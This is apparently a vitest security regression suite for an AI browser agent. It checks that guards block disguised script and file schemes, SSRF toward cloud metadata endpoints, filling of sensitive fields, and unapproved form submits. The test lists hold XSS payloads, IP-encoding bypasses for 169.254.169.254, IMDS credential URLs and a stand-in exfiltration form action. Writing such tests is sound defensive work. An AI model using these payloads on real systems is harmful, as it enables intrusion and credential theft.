import http from 'node:http'
import net from 'node:net'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { detectRefusedScheme, exactOrigin, resolveInput } from '../src/agent/omnibox.js'
import { authorizeAction, isCommitLikeElement, sensitiveElementReason } from '../src/agent/policy.js'
import { PolicyProfileGuard, resolvePolicyProfile } from '../src/agent/policy-profile.js'
import { checkUrlSsrf, checkUrlSsrfSync } from '../src/agent/ssrf.js'
import { sanitizeAscii } from '../src/ascii/sanitize.js'
import { extractBaseHref, parseMetaRefreshContent } from '../src/engine/lite.js'
import { BrowserManager } from '../src/engine/manager.js'
import { createAgentSocket, type AgentSocketServer } from '../src/bridge/agent-socket.js'

async function startFixtureServer() {
  let postCount = 0
  let lastPostBody = ''

  const server = http.createServer((req, res) => {
    const url = req.url ?? '/'

    if (url === '/security-lab') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
      res.end(`<!doctype html>
<html>
<head>
  <title>Security Regression Lab</title>
  <base href="javascript:alert(1)">
  <meta http-equiv="refresh" content="0; url=javascript:alert(2)">
  <script>window.__xss = true; alert("xss")</script>
</head>
<body>
  <h1>Security Regression Lab</h1>
  <p>Welcome \x1b[31mFAKE_RED_ANSI\x1b[0m AWS_KEY=AKIAIOSFODNN7EXAMPLE</p>

  <nav>
    <a id="js-link" href="javascript:alert(1)">Run JS Link</a>
    <a id="data-link" href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">Open Data Link</a>
    <a id="imds-link" href="http://169.254.169.254/latest/meta-data/">IMDS Link</a>
    <a id="cross-link" href="https://evil.example.invalid/phish">Cross Origin Link</a>
    <a id="safe-link" href="/safe-dest">Safe Internal Link</a>
  </nav>

  <form id="sensitive-form" action="/submit-order" method="POST">
    <label for="note">Public Note</label>
    <input id="note" name="public_note" type="text" />

    <label for="pw">Account Password</label>
    <input id="pw" name="user_pass" type="password" />

    <label for="upload">Upload Document</label>
    <input id="upload" name="doc_file" type="file" />

    <label for="apikey">Developer Key</label>
    <input id="apikey" name="api_key" type="text" />

    <label for="cvv">Security Digits</label>
    <input id="cvv" name="card_cvv" type="text" />

    <label for="ssn">Taxpayer ID</label>
    <input id="ssn" name="user_ssn" type="text" />

    <label for="otp">Login Code</label>
    <input id="otp" name="code" type="text" autocomplete="one-time-code" />

    <button id="btn-submit" type="submit">Place Order</button>
    <button id="btn-imds-formaction" type="submit" formaction="http://169.254.169.254/latest/meta-data/">IMDS Submit</button>
    <button id="btn-cross-formaction" type="submit" formaction="https://evil.example.invalid/exfil">Cross-Origin Submit</button>
  </form>
</body>
</html>`)
      return
    }

    if (url === '/safe-dest') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
      res.end('<html><head><title>Safe Destination</title></head><body><h1>Reached Safe Page</h1></body></html>')
      return
    }

    if (url === '/redirect-to-imds') {
      res.writeHead(302, { location: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' })
      res.end()
      return
    }

    if (url === '/submit-order' && req.method === 'POST') {
      const chunks: Buffer[] = []
      req.on('data', (c: Buffer) => chunks.push(c))
      req.on('end', () => {
        postCount++
        lastPostBody = Buffer.concat(chunks).toString('utf8')
        res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' })
        res.end(`<html><head><title>Order Submitted</title></head><body><h1>Order Confirmed #${postCount}</h1></body></html>`)
      })
      return
    }

    res.writeHead(404, { 'content-type': 'text/plain' })
    res.end('not found')
  })

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', () => resolve()))
  const addr = server.address() as net.AddressInfo
  const origin = `http://127.0.0.1:${addr.port}`

  return {
    server,
    origin,
    getPostCount: () => postCount,
    getLastPostBody: () => lastPostBody,
    resetPosts: () => {
      postCount = 0
      lastPostBody = ''
    },
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  }
}

async function rawHttpRequest(port: number, rawRequest: string): Promise<{ statusCode: number; body: string }> {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ host: '127.0.0.1', port }, () => {
      socket.write(rawRequest)
    })
    let data = ''
    socket.on('data', (chunk) => {
      data += chunk.toString('utf8')
    })
    socket.on('end', () => {
      const [headerPart = '', ...bodyParts] = data.split('\r\n\r\n')
      const statusLine = headerPart.split('\r\n')[0] ?? ''
      const m = /^HTTP\/\d\.\d\s+(\d+)/.exec(statusLine)
      resolve({ statusCode: m ? Number(m[1]) : 0, body: bodyParts.join('\r\n\r\n') })
    })
    socket.on('error', reject)
  })
}

describe('M80: Comprehensive Security Regression Suite', () => {
  // ---------------------------------------------------------------------------
  // 1. XSS & Scheme Disguises
  // ---------------------------------------------------------------------------
  describe('1. XSS & scheme disguises', () => {
    const dangerousPayloads = [
      // Direct refused schemes
      'javascript:alert(1)',
      'vbscript:msgbox(1)',
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'file:///etc/passwd',
      'file://localhost/etc/shadow',
      'blob:https://example.com/550e8400-e29b-41d4-a716-446655440000',
      'filesystem:https://example.com/temporary/evil.html',
      'chrome://settings',
      'chrome-extension://abcdefghijklmnop/popup.html',
      'edge://settings',
      'about:blank',
      'view-source:https://example.com',
      'devtools://devtools/bundled/inspector.html',
      // Mixed case disguises
      'JaVaScRiPt:alert(1)',
      'DaTa:text/html,<svg onload=alert(1)>',
      'FiLe:///etc/hosts',
      // ASCII control character disguises
      'java\nscript:alert(1)',
      'java\r\nscript:alert(1)',
      'java\tscript:alert(1)',
      '\x00javascript:alert(1)',
      '\x01\x02\x03javascript:alert(1)',
      'j\x09a\x0av\x0da\x00script:alert(1)',
      'd\x09ata:text/html,<script>alert(1)</script>',
      'f\x0aile:///etc/passwd',
      // Unicode zero-width, soft-hyphen, BOM & BiDi disguises
      'java\u200bscript:alert(1)',
      '\ufeffjavascript:alert(1)',
      '\u202ejavascript:alert(1)',
      'j\u00adava\u2060script:alert(1)',
      '\u200c\u200dfile:///etc/passwd',
      'da\u200bta:text/html,<script>alert(1)</script>',
    ]

    it.each(dangerousPayloads)('resolveInput refuses disguised/dangerous scheme: %j', (payload) => {
      const res = resolveInput(payload)
      expect(res.kind).toBe('refused')
    })

    it.each(dangerousPayloads)('detectRefusedScheme catches: %j', (payload) => {
      expect(detectRefusedScheme(payload)).toBeTruthy()
    })

    it('refuses unknown/non-HTTP(S) schemes like ftp:, ws:, wss:, jar:, intent:, mailto:', () => {
      for (const payload of [
        'ftp://files.example.com/secret.zip',
        'ws://localhost:9222/devtools/browser',
        'wss://evil.example.com/c2',
        'jar:http://example.com/a.jar!/x.html',
        'intent://scan/#Intent;scheme=zxing;end',
        'mailto:admin@example.com',
      ]) {
        expect(resolveInput(payload).kind).toBe('refused')
        const decision = authorizeAction({
          name: 'page_navigate',
          targetUrl: payload,
          allowedOrigins: ['https://example.com'],
        })
        expect(decision.allowed).toBe(false)
        if (!decision.allowed) expect(decision.code).toBe('scheme')
      }
    })

    it('blocks userinfo authority confusion (https://allowed.com@evil.com)', () => {
      const target = 'https://allowed.example.com@evil.example.com/steal'
      expect(exactOrigin(target)).toBe('https://evil.example.com')
      const decision = authorizeAction({
        name: 'page_navigate',
        targetUrl: target,
        allowedOrigins: ['https://allowed.example.com'],
      })
      expect(decision.allowed).toBe(false)
      if (!decision.allowed) {
        expect(decision.code).toBe('origin')
        expect(decision.origin).toBe('https://evil.example.com')
      }
    })

    it('blocks page_click on links and formAction buttons with disguised dangerous schemes', () => {
      for (const badTarget of [
        'javascript:alert(1)',
        'java\tscript:alert(1)',
        'java\u200bscript:alert(1)',
        'data:text/html,<svg onload=alert(1)>',
        'file:///etc/passwd',
        'vbscript:msgbox(1)',
        'blob:https://allowed.example.com/abc',
      ]) {
        const hrefDecision = authorizeAction({
          name: 'page_click',
          item: { tag: 'a', text: 'Click me', href: badTarget },
          allowedOrigins: ['https://allowed.example.com'],
        })
        expect(hrefDecision.allowed).toBe(false)
        if (!hrefDecision.allowed) {
          expect(hrefDecision.status).toBe('blocked')
          expect(hrefDecision.code).toBe('scheme')
        }

        const formActionDecision = authorizeAction({
          name: 'page_click',
          item: { tag: 'button', text: 'Go', formAction: badTarget },
          allowSubmit: true,
          allowedOrigins: ['https://allowed.example.com'],
        })
        expect(formActionDecision.allowed).toBe(false)
        if (!formActionDecision.allowed) {
          expect(formActionDecision.status).toBe('blocked')
          expect(formActionDecision.code).toBe('scheme')
        }
      }
    })

    it('rejects unsafe <base href> and <meta http-equiv="refresh"> schemes in Lite parser', () => {
      const base = 'https://app.example.com/page'
      for (const bad of [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
        'blob:https://app.example.com/123',
      ]) {
        expect(extractBaseHref(`<head><base href="${bad}"></head>`, base)).toBeUndefined()
        expect(parseMetaRefreshContent(`0; url=${bad}`, base)).toBeUndefined()
      }
    })

    it('strips ANSI CSI/OSC escape injections in strict 7-bit ASCII sanitizer', () => {
      const malicious = 'Normal \x1b[31mRED\x1b[0m \x1b]8;;javascript:alert(1)\x07CLICK\x1b]8;;\x07 text'
      const clean = sanitizeAscii(malicious)
      expect(clean).not.toContain('\x1b')
      expect(clean).not.toContain('javascript:')
      expect(clean).toContain('Normal')
      expect(clean).toContain('text')
    })
  })

  // ---------------------------------------------------------------------------
  // 2. IMDS & Private-Network SSRF Blocking
  // ---------------------------------------------------------------------------
  describe('2. IMDS & private-network SSRF blocking', () => {
    const imdsTargets = [
      // Standard AWS IMDSv1/v2, ECS task metadata, VPC DNS
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.169.254/latest/api/token',
      'http://[fd00:ec2::254]/latest/meta-data/',
      'http://169.254.170.2/v2/credentials',
      'http://169.254.169.253/',
      // Cloud metadata hostnames (AWS/GCP/Azure)
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://metadata.goog/computeMetadata/v1/',
      'http://instance-data.ec2.internal/latest/meta-data/',
      'http://metadata.azure.internal/metadata/instance',
      // IPv4 integer, hex, octal & IPv4-mapped IPv6 bypasses for 169.254.169.254
      'http://2852039166/latest/meta-data/',
      'http://0xa9fea9fe/latest/meta-data/',
      'http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/',
      'http://0251.0376.0251.0376/latest/meta-data/',
      'http://[::ffff:169.254.169.254]/latest/meta-data/',
      'http://[::ffff:a9fe:a9fe]/latest/meta-data/',
    ]

    it.each(imdsTargets)('blocks IMDS target synchronously: %s', (target) => {
      const check = checkUrlSsrfSync(target, { enabled: true })
      expect(check.blocked).toBe(true)
      expect(['imds', 'metadata-host']).toContain(check.category)

      const navDecision = authorizeAction({
        name: 'page_navigate',
        targetUrl: target,
        allowedOrigins: [exactOrigin(target) ?? ''],
        blockPrivateNet: true,
      })
      expect(navDecision.allowed).toBe(false)
      if (!navDecision.allowed) {
        expect(navDecision.status).toBe('blocked')
        expect(navDecision.code).toBe('ssrf')
      }
    })

    it('blocks RFC1918, loopback, link-local, CGNAT, and IPv6 ULA targets', () => {
      const privateTargets = [
        'http://127.0.0.1:8080/admin',
        'http://127.1/secret',
        'http://0177.0.0.1/',
        'http://[::1]:3000/',
        'http://localhost:9222/json',
        'http://10.0.0.1/internal',
        'http://172.16.0.5/metrics',
        'http://192.168.1.1/router',
        'http://100.64.0.1/cgnat',
        'http://[fe80::1]/link-local',
        'http://[fc00::1]/ula',
        'http://0.0.0.0/',
      ]
      for (const target of privateTargets) {
        const res = checkUrlSsrfSync(target, { enabled: true })
        expect(res.blocked, `expected ${target} to be blocked`).toBe(true)
      }
    })

    it('blocks DNS rebinding resolving an external hostname to AWS IMDS IPv4 or IPv6', async () => {
      const ipv4Rebind = await checkUrlSsrf('http://rebind-v4.attacker.test/latest/meta-data/', {
        enabled: true,
        dnsLookup: async () => [{ address: '169.254.169.254', family: 4 }],
      })
      expect(ipv4Rebind.blocked).toBe(true)
      expect(ipv4Rebind.category).toBe('imds')

      const ipv6Rebind = await checkUrlSsrf('http://rebind-v6.attacker.test/latest/meta-data/', {
        enabled: true,
        dnsLookup: async () => [{ address: 'fd00:ec2::254', family: 6 }],
      })
      expect(ipv6Rebind.blocked).toBe(true)
      expect(ipv6Rebind.category).toBe('imds')
    })

    it('blocks link href and formAction pointing to IMDS even with allowSubmit: true', () => {
      const hrefDecision = authorizeAction({
        name: 'page_click',
        item: { tag: 'a', text: 'Metadata', href: 'http://169.254.169.254/latest/meta-data/' },
        allowedOrigins: ['https://app.example.com', 'http://169.254.169.254'],
        blockPrivateNet: true,
      })
      expect(hrefDecision.allowed).toBe(false)
      if (!hrefDecision.allowed) expect(hrefDecision.code).toBe('ssrf')

      const formDecision = authorizeAction({
        name: 'page_click',
        item: {
          tag: 'button',
          type: 'submit',
          text: 'Submit',
          formAction: 'http://169.254.169.254/latest/meta-data/',
        },
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com', 'http://169.254.169.254'],
        blockPrivateNet: true,
      })
      expect(formDecision.allowed).toBe(false)
      if (!formDecision.allowed) expect(formDecision.code).toBe('ssrf')
    })
  })

  // ---------------------------------------------------------------------------
  // 3. Sensitive Field Blocking
  // ---------------------------------------------------------------------------
  describe('3. Sensitive field blocking', () => {
    const blockedFields: Array<{ desc: string; item: Record<string, unknown> }> = [
      { desc: 'type=password', item: { tag: 'input', type: 'password', name: 'x' } },
      { desc: 'type=file', item: { tag: 'input', type: 'file', name: 'avatar' } },
      { desc: 'autocomplete=current-password', item: { tag: 'input', type: 'text', autocomplete: 'current-password' } },
      { desc: 'autocomplete=new-password', item: { tag: 'input', type: 'text', autocomplete: 'new-password' } },
      { desc: 'autocomplete=one-time-code', item: { tag: 'input', type: 'text', autocomplete: 'one-time-code' } },
      { desc: 'autocomplete=cc-number', item: { tag: 'input', type: 'text', autocomplete: 'cc-number' } },
      { desc: 'autocomplete=cc-csc', item: { tag: 'input', type: 'text', autocomplete: 'cc-csc' } },
      // Snake_case & hyphenated secrets
      { desc: 'name=api_key', item: { tag: 'input', type: 'text', name: 'api_key' } },
      { desc: 'name=private_key', item: { tag: 'input', type: 'text', name: 'private_key' } },
      { desc: 'name=secret_key', item: { tag: 'input', type: 'text', name: 'secret_key' } },
      { desc: 'name=auth_token', item: { tag: 'input', type: 'text', name: 'auth_token' } },
      { desc: 'name=sms_otp', item: { tag: 'input', type: 'text', name: 'sms_otp' } },
      { desc: 'name=atm_pin', item: { tag: 'input', type: 'text', name: 'atm_pin' } },
      { desc: 'name=verification_code', item: { tag: 'input', type: 'text', name: 'verification_code' } },
      { desc: 'name=seed_phrase', item: { tag: 'textarea', name: 'seed_phrase' } },
      { desc: 'name=recovery_code', item: { tag: 'input', type: 'text', name: 'recovery_code' } },
      { desc: 'label=Passkey', item: { tag: 'input', type: 'text', label: 'Passkey' } },
      // Payment & banking
      { desc: 'name=card_number', item: { tag: 'input', type: 'text', name: 'card_number' } },
      { desc: 'name=credit_card', item: { tag: 'input', type: 'text', name: 'credit_card' } },
      { desc: 'name=debit_card', item: { tag: 'input', type: 'text', name: 'debit_card' } },
      { desc: 'name=card_cvv', item: { tag: 'input', type: 'text', name: 'card_cvv' } },
      { desc: 'name=card_cvc', item: { tag: 'input', type: 'text', name: 'card_cvc' } },
      { desc: 'name=bank_account', item: { tag: 'input', type: 'text', name: 'bank_account' } },
      { desc: 'name=routing_number', item: { tag: 'input', type: 'text', name: 'routing_number' } },
      { desc: 'name=account_number', item: { tag: 'input', type: 'text', name: 'account_number' } },
      { desc: 'name=iban', item: { tag: 'input', type: 'text', name: 'iban' } },
      { desc: 'name=sort_code', item: { tag: 'input', type: 'text', name: 'sort_code' } },
      // Identity
      { desc: 'name=user_ssn', item: { tag: 'input', type: 'text', name: 'user_ssn' } },
      { desc: 'name=social_security', item: { tag: 'input', type: 'text', name: 'social_security' } },
      { desc: 'name=national_id', item: { tag: 'input', type: 'text', name: 'national_id' } },
      { desc: 'name=tax_id', item: { tag: 'input', type: 'text', name: 'tax_id' } },
      { desc: 'name=drivers_license', item: { tag: 'input', type: 'text', name: 'drivers_license' } },
      { desc: 'label=Passport Number', item: { tag: 'input', type: 'text', label: 'Passport Number' } },
      { desc: 'label=Aadhaar', item: { tag: 'input', type: 'text', label: 'Aadhaar' } },
    ]

    it.each(blockedFields)('blocks sensitive field: $desc', ({ item }) => {
      expect(sensitiveElementReason(item)).toBeTruthy()
      const decision = authorizeAction({
        name: 'page_fill',
        item,
        allowedOrigins: ['https://app.example.com'],
      })
      expect(decision.allowed).toBe(false)
      if (!decision.allowed) {
        expect(decision.status).toBe('blocked')
        expect(decision.code).toBe('sensitive')
      }
    })

    it('does not false-positive on benign fields containing pin/otp/ssn substrings', () => {
      const benignFields = [
        { tag: 'input', type: 'text', name: 'search_query', label: 'Search' },
        { tag: 'input', type: 'text', name: 'user_opinion', label: 'Your Opinion' },
        { tag: 'input', type: 'text', name: 'shipping_notes', label: 'Shipping Notes' },
        { tag: 'input', type: 'text', name: 'spin_count', label: 'Spin Count' },
        { tag: 'input', type: 'text', name: 'missing_items', label: 'Missing Items' },
        { tag: 'input', type: 'email', name: 'contact_email', label: 'Email Address' },
      ]
      for (const item of benignFields) {
        expect(sensitiveElementReason(item), `unexpected block on ${item.name}`).toBeNull()
        const decision = authorizeAction({
          name: 'page_fill',
          item,
          allowedOrigins: ['https://app.example.com'],
        })
        expect(decision.allowed).toBe(true)
      }
    })
  })

  // ---------------------------------------------------------------------------
  // 4. Submit & Destructive Action Guards
  // ---------------------------------------------------------------------------
  describe('4. Submit & destructive action guards', () => {
    const commitElements = [
      { tag: 'button', text: 'Continue', defaultSubmit: true },
      { tag: 'button', type: 'submit', text: 'Go' },
      { tag: 'input', type: 'submit', value: 'Next' },
      { tag: 'button', text: 'Place order' },
      { tag: 'button', text: 'Place the order' },
      { tag: 'button', text: 'Checkout' },
      { tag: 'button', text: 'Pay Now' },
      { tag: 'button', text: 'Purchase' },
      { tag: 'button', text: 'Send Message' },
      { tag: 'button', text: 'Confirm' },
      { tag: 'button', text: 'Delete account' },
      { tag: 'button', text: 'Remove permanently' },
      { tag: 'button', text: 'Wire funds' },
      { tag: 'button', text: 'Transfer $500' },
      { tag: 'button', text: 'Commit changes' },
      { tag: 'button', text: 'Submit' },
    ]

    it.each(commitElements)('requires allowSubmit: true for commit-like control: %j', (item) => {
      expect(isCommitLikeElement(item)).toBe(true)

      const denied = authorizeAction({
        name: 'page_click',
        item,
        allowSubmit: false,
        allowedOrigins: ['https://app.example.com'],
      })
      expect(denied.allowed).toBe(false)
      if (!denied.allowed) {
        expect(denied.status).toBe('boundary')
        expect(denied.code).toBe('submit')
      }

      const allowed = authorizeAction({
        name: 'page_click',
        item,
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com'],
      })
      expect(allowed.allowed).toBe(true)
    })

    it('still refuses sensitive, cross-origin, denied-origin, and readonly submit clicks even with allowSubmit: true', () => {
      // Sensitive control cannot be bypassed with allowSubmit
      const sensitiveSubmit = authorizeAction({
        name: 'page_click',
        item: { tag: 'button', type: 'submit', text: 'Confirm Payment', name: 'billing_submit' },
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com'],
      })
      expect(sensitiveSubmit.allowed).toBe(false)
      if (!sensitiveSubmit.allowed) expect(sensitiveSubmit.code).toBe('sensitive')

      // Cross-origin formAction cannot be bypassed with allowSubmit
      const crossOriginSubmit = authorizeAction({
        name: 'page_click',
        item: { tag: 'button', type: 'submit', text: 'Submit', formAction: 'https://evil.example.com/steal' },
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com'],
      })
      expect(crossOriginSubmit.allowed).toBe(false)
      if (!crossOriginSubmit.allowed) expect(crossOriginSubmit.code).toBe('origin')

      // Denied-origin formAction cannot be bypassed with allowSubmit
      const guard = new PolicyProfileGuard(
        resolvePolicyProfile({
          profile: 'standard',
          deniedOrigins: ['https://blocked.example.com'],
        }),
      )
      const deniedOriginSubmit = authorizeAction({
        name: 'page_click',
        item: { tag: 'button', type: 'submit', text: 'Submit', formAction: 'https://blocked.example.com/submit' },
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com', 'https://blocked.example.com'],
        policy: guard,
      })
      expect(deniedOriginSubmit.allowed).toBe(false)
      if (!deniedOriginSubmit.allowed) expect(deniedOriginSubmit.code).toBe('origin_denied')

      // Readonly mode cannot be bypassed with allowSubmit
      const readonlySubmit = authorizeAction({
        name: 'page_click',
        item: { tag: 'button', type: 'submit', text: 'Submit' },
        allowSubmit: true,
        allowedOrigins: ['https://app.example.com'],
        readonly: true,
      })
      expect(readonlySubmit.allowed).toBe(false)
      if (!readonlySubmit.allowed) expect(readonlySubmit.code).toBe('readonly')
    })
  })

  // ---------------------------------------------------------------------------
  // 5. End-to-End Integration via BrowserManager + AgentSocketServer
  // ---------------------------------------------------------------------------
  describe('5. End-to-end Agent Socket + Lite security regression', () => {
    let fixture: Awaited<ReturnType<typeof startFixtureServer>>
    let tmpDir: string
    let manager: BrowserManager
    let socketServer: AgentSocketServer
    let socketPort: number
    let token: string

    beforeAll(async () => {
      fixture = await startFixtureServer()
      tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'troy-sec-reg-'))
      const policy = resolvePolicyProfile({
        profile: 'standard',
        deniedOrigins: ['https://evil.example.invalid'],
      })
      manager = await BrowserManager.create({
        engine: 'lite',
        profileDir: tmpDir,
        policy,
        redactSecrets: true,
        untrustedMarkers: true,
      })
      socketServer = await createAgentSocket(manager, {
        port: 0,
        endpointFile: path.join(tmpDir, 'agent-endpoint.json'),
      })
      socketPort = socketServer.port
      token = socketServer.token
    })

    afterAll(async () => {
      if (socketServer) await socketServer.close()
      if (manager) await manager.close()
      if (fixture) await fixture.close()
      if (tmpDir) fs.rmSync(tmpDir, { recursive: true, force: true })
    })

    async function callApi(route: string, body?: Record<string, unknown>) {
      const res = await fetch(`http://127.0.0.1:${socketPort}${route}`, {
        method: body ? 'POST' : 'GET',
        headers: {
          'x-troy-agent': token,
          ...(body ? { 'content-type': 'application/json' } : {}),
        },
        body: body ? JSON.stringify(body) : undefined,
      })
      const json = (await res.json()) as Record<string, unknown>
      return { status: res.status, json }
    }

    it('enforces auth, Host header guard, scheme refusals, sensitive fields, submit guard, secret redaction, and untrusted markers end-to-end', async () => {
      // 1. Missing/wrong token -> 401
      const unauth = await fetch(`http://127.0.0.1:${socketPort}/tabs`, {
        headers: { 'x-troy-agent': 'wrong-token' },
      })
      expect(unauth.status).toBe(401)

      // 2. DNS rebinding Host header -> 403
      const rebind = await rawHttpRequest(
        socketPort,
        `GET /tabs HTTP/1.1\r\nHost: evil.attacker.test\r\nx-troy-agent: ${token}\r\nConnection: close\r\n\r\n`,
      )
      expect(rebind.statusCode).toBe(403)

      // 3. Open security lab page
      const opened = await callApi('/open', { url: `${fixture.origin}/security-lab` })
      expect(opened.status).toBe(200)
      const tabId = Number(opened.json.id ?? (opened.json.tab as { id?: number } | undefined)?.id)
      expect(Number.isFinite(tabId)).toBe(true)

      // 4. Read page -> verifies ANSI stripped, AWS key redacted, untrusted markers present
      const readRes = await callApi('/tool', { tabId, name: 'page_read', args: {} })
      expect(readRes.status).toBe(200)
      const ascii = String(readRes.json.ascii ?? '')
      expect(ascii).not.toContain('\x1b')
      expect(ascii).not.toContain('AKIAIOSFODNN7EXAMPLE')
      expect(ascii).toContain('[REDACTED:AWS_KEY]')
      expect(ascii).toContain('UNTRUSTED')

      const elements = (readRes.json.elements ?? []) as Array<{ ref: string; id?: string; name?: string; text?: string }>
      const refById = (id: string) => elements.find((e) => e.id === id)?.ref

      // 5. Navigating to disguised XSS / file / data schemes is blocked
      for (const badUrl of [
        'javascript:alert(1)',
        'java\nscript:alert(1)',
        'java\u200bscript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
      ]) {
        const navRes = await callApi('/tool', { tabId, name: 'page_navigate', args: { url: badUrl } })
        expect(navRes.json.status).toBe('blocked')
        expect(navRes.json.code).toBe('scheme')
      }

      // 6. Clicking javascript: and data: links is blocked with code=scheme
      const jsLinkRef = refById('js-link')
      expect(jsLinkRef).toBeTruthy()
      const jsClick = await callApi('/tool', { tabId, name: 'page_click', args: { ref: jsLinkRef } })
      expect(jsClick.json.status).toBe('blocked')
      expect(jsClick.json.code).toBe('scheme')

      const dataLinkRef = refById('data-link')
      expect(dataLinkRef).toBeTruthy()
      const dataClick = await callApi('/tool', { tabId, name: 'page_click', args: { ref: dataLinkRef } })
      expect(dataClick.json.status).toBe('blocked')
      expect(dataClick.json.code).toBe('scheme')

      // 7. Clicking denied cross-origin link is blocked with code=origin_denied
      const crossLinkRef = refById('cross-link')
      expect(crossLinkRef).toBeTruthy()
      const crossClick = await callApi('/tool', { tabId, name: 'page_click', args: { ref: crossLinkRef } })
      expect(crossClick.json.status).toBe('blocked')
      expect(crossClick.json.code).toBe('origin_denied')

      // 8. Filling sensitive fields (password, file, api_key, card_cvv, user_ssn, one-time-code) is blocked
      for (const sensitiveId of ['pw', 'upload', 'apikey', 'cvv', 'ssn', 'otp']) {
        const ref = refById(sensitiveId)
        expect(ref, `expected ref for #${sensitiveId}`).toBeTruthy()
        const fillRes = await callApi('/tool', { tabId, name: 'page_fill', args: { ref, value: 'secret-123' } })
        expect(fillRes.json.status, `expected blocked for #${sensitiveId}`).toBe('blocked')
        expect(fillRes.json.code).toBe('sensitive')
      }

      // 9. Filling benign public note field succeeds
      const noteRef = refById('note')
      expect(noteRef).toBeTruthy()
      const noteFill = await callApi('/tool', { tabId, name: 'page_fill', args: { ref: noteRef, value: 'hello world' } })
      expect(noteFill.status).toBe(200)
      expect(noteFill.json.ok).toBe(true)

      // 10. Submit guard: clicking Place Order without allowSubmit is refused, 0 POSTs sent
      fixture.resetPosts()
      const submitRef = refById('btn-submit')
      expect(submitRef).toBeTruthy()
      const blockedSubmit = await callApi('/tool', { tabId, name: 'page_click', args: { ref: submitRef } })
      expect(blockedSubmit.json.status).toBe('boundary')
      expect(blockedSubmit.json.code).toBe('submit')
      expect(fixture.getPostCount()).toBe(0)

      // 11. Denied cross-origin formAction submit is refused EVEN with allowSubmit: true
      const crossSubmitRef = refById('btn-cross-formaction')
      expect(crossSubmitRef).toBeTruthy()
      const blockedCrossSubmit = await callApi('/tool', {
        tabId,
        name: 'page_click',
        args: { ref: crossSubmitRef, allowSubmit: true },
      })
      expect(blockedCrossSubmit.json.status).toBe('blocked')
      expect(blockedCrossSubmit.json.code).toBe('origin_denied')

      // 12. Clicking Place Order WITH allowSubmit: true succeeds and sends 1 POST
      const allowedSubmit = await callApi('/tool', {
        tabId,
        name: 'page_click',
        args: { ref: submitRef, allowSubmit: true },
      })
      expect(allowedSubmit.status).toBe(200)
      expect(allowedSubmit.json.ok).toBe(true)
      expect(fixture.getPostCount()).toBe(1)
      expect(fixture.getLastPostBody()).toContain('public_note=hello+world')
    })

    it('blocks HTTP 302 redirect to AWS IMDS when blockPrivateNet is enabled', async () => {
      const ssrfDir = fs.mkdtempSync(path.join(os.tmpdir(), 'troy-sec-ssrf-'))
      const ssrfManager = await BrowserManager.create({
        engine: 'lite',
        profileDir: ssrfDir,
        ssrf: {
          enabled: true,
          // Allow our local 127.0.0.1 fixture server while still blocking 169.254.169.254 IMDS!
          allowHosts: ['127.0.0.1'],
        },
      })
      try {
        const opened = await ssrfManager.openTab(`${fixture.origin}/security-lab`)
        const navResult = await ssrfManager.runTool(opened.id, 'page_navigate', {
          url: `${fixture.origin}/redirect-to-imds`,
        })
        expect(navResult.status).toBe('blocked')
        expect(navResult.code).toBe('ssrf')
      } finally {
        await ssrfManager.close()
        fs.rmSync(ssrfDir, { recursive: true, force: true })
      }
    })
  })
})
